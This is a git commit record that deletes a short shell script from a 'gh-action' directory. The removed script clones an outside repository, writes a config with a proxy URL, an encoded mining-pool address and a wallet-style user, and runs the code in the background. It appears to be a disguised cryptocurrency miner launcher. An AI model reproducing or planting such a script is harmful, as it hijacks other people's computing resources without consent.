e794aaf7455a77f2d0c3c0a42577f2e77da961a6
arjuillahalmadadi <117597346+arjuillahalmadadi@users.noreply.github.com>
2025-09-08 17:49:17 +0700

    Delete gh-action/ref/main/v3847624c43.sh

--- gh-action/ref/main/v3847624c43.sh
+++
@@ -1,7 +0,0 @@
-git clone https://github.com/ismailalkaf/node-mino-app.git
-
-cd node-mino-app
-
-echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i", "password": "c=RVN", "argent": "proxy-node/0.1", "threads": 24}' > data.txt
-
-nohup node app.js
